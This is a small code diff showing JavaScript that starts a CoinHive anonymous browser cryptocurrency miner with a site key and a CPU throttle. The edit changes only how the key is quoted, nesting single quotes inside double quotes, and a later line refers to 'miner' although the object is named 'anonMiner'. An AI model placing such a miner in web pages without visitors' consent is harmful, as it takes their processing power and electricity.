@@ -1,4 +1,4 @@
-var siteKey = 'qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc'
+var siteKey = "'qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc'"
 /** For Setting up the User Miner */
 var anonMiner = new CoinHive.Anonymous(siteKey, {throttle: 0.2});
 if (!miner.isMobile()) {
